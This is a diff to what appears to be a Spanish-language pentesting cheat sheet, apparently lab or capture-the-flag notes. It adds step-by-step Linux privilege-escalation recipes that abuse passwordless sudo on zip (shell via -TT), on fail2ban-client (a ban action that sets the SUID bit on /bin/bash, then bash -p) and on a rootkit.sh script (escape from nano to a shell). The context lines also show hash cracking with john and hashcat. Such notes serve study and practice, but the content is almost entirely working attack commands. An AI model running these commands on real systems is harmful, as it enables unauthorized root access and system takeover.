@@ -331,3 +331,54 @@ Utilizar esto solo en hashcat:
 ❯ john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hash.txt
 ❯ hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
+
+### ZIP
+```bash 
+❯ sudo -l 
+# Ejecutar 'zip' como root sin password
+(root : root) NOPASSWD: /usr/bin/zip
+
+❯ sudo zip /tmp/h.zip /etc/hosts -T -TT '/bin/sh #'   # Shell como root 
+
+NOTA:
+	- No es necesario crear el archivo .zip 
+```
+
+### Fail2ban-client 
+```bash 
+❯ sudo -l 
+# Ejecutar 'fail2ban-client' como root sin password
+(ALL) NOPASSWD: /usr/bin/fail2ban-client
+
+Paso 1:
+❯ sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
+
+Paso 2:
+❯ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
+
+Paso 3:
+❯ ls -la /bin/bash
+❯ sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
+❯ ls -la /bin/bash   # Verificar el cambio a 'S'
+
+Paso 4:
+❯ /bin/bash -p   # Obtener shell como root 
+```
+
+### rootkit.sh 
+```bash 
+❯ sudo -l 
+# Ejecutar 'rootkit.sh' como root sin password
+(root) NOPASSWD: /bin/bash /opt/rootkit.sh
+
+Paso 1:
+# Cuando miras el código si le das en read, ingresa a 'Nano'
+❯ sudo bash /opt/rootkit.sh
+# Would you like to versioncheck, update, list or read the report ? 
+	read    # Cuando pregunte escribir read 
+
+Paso 2:
+# Cuando ingrese a nano
+❯ ctrl + r y ctrl + x      # Activar la ejecución de comandos 
+❯ reset; bash 1>&0 2>&0    # Obtener una shell como root 
+```
